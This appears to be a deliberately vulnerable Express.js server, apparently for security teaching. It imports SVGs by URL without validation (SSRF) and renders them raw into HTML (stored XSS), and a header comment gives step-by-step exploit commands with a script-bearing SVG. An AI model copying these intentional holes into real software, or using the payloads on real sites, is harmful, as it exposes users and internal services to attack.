// ============================================================
// VULNERABILITIES:
//   1. SSRF  – fetch(url) without allowlist lets attackers hit
//              internal services (http://169.254.169.254/..., etc.)
//   2. Stored XSS – SVG content is fetched and written to disk,
//              then rendered raw in HTML with ${svg}.
//              A malicious SVG can contain <script> tags.
// ============================================================

// ============================================================
// # 1. Host a malicious SVG on a local server (in another terminal):
// How to Exploit:
//   echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>' > evil.svg
//   python3 -m http.server 8888

// # 2. Import the malicious SVG:
//    curl -X POST http://localhost:3001/import-url \
//      -H "Content-Type: application/json" \
//      -d '{"url":"http://localhost:8888/evil.svg"}'

// # 3. Open the returned filename in a browser → alert fires
// ============================================================

const express = require('express');
const path    = require('path');
const fs      = require('fs');
const { v4: uuidv4 } = require('uuid');
const app     = express();
app.use(express.json());

const UPLOAD_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);

// Import an SVG by URL and save it locally
app.post('/import-url', async (req, res) => {
  const url = req.body.url;
  if (!url) return res.status(400).send('Missing url');

  try {
    const r    = await fetch(url, { timeout: 5000 });  // ← SSRF: no URL validation
    const text = await r.text();

    const filename = `${uuidv4()}.svg`;
    const filepath = path.join(UPLOAD_DIR, filename);
    fs.writeFileSync(filepath, text, 'utf8');           // ← stores attacker-controlled content

    res.redirect('/');
  } catch (e) {
    res.status(500).send('Failed to fetch URL: ' + String(e));
  }
});

app.get('/view/:name', (req, res) => {
  const name     = req.params.name;
  const safeName = path.basename(name);
  const filePath = path.join(UPLOAD_DIR, safeName);

  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');

  const svg = fs.readFileSync(filePath, 'utf8');

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`                               
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>View SVG - ${safeName}</title></head>
      <body>
        <h1>Viewing SVG: ${safeName}</h1>
        <div id="preview">
          ${svg}                           <!-- ← XSS: raw SVG injected into HTML -->
        </div>
        <p><a href="/">Back</a></p>
      </body>
    </html>
  `);
});

app.get('/', (req, res) => {
  const files = fs.readdirSync(UPLOAD_DIR);
  res.send(`<ul>${files.map(f => `<li><a href="/view/${f}">${f}</a></li>`).join('')}</ul>`);
});

app.listen(3001, () => console.log('Server on http://localhost:3001'));
